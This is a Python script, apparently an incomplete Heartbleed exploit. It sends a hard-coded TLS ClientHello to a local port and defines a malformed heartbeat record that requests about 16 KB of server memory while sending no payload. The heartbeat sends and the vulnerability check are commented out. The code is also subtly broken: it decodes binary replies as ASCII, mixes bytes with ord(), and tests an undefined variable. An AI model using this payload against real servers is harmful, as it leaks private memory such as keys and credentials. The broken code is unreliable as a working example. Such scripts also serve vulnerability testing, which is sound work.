import socket
import codecs
from socket import AF_INET, SOCK_STREAM

TLS_MESSAGE = '''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
'''

HEARTBEAT = '''
18 03 02 00 03
01 40 00
'''


def encode(input):
    return codecs.decode(input.replace(' ', '').replace('\n', ''), 'hex')


def dump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))


def main():
    s = socket.socket(AF_INET, SOCK_STREAM)
    s.connect(('127.0.0.1', 8443))
    s.send(encode(TLS_MESSAGE))

    while True:
        msg = s.recvmsg(1024)
        # if type is None:
        print(msg[0].decode('ascii'))
            #print('Server never replied')

        # if type == 22 and ord(payload[0] == 0x0E):
        #     break

    # s.send(encode(HEARTBEAT))
    # s.send(encode(HEARTBEAT))
    # while True:
    #     msg = s.recvmsg(1024)
    #     if type == 24:
    #         dump(payload)
    #         if len(payload) > 3:
    #             print('Server is vulnerable')
    #         else:
    #             print('Server did not return any extra data')


if __name__ == '__main__':
    main()
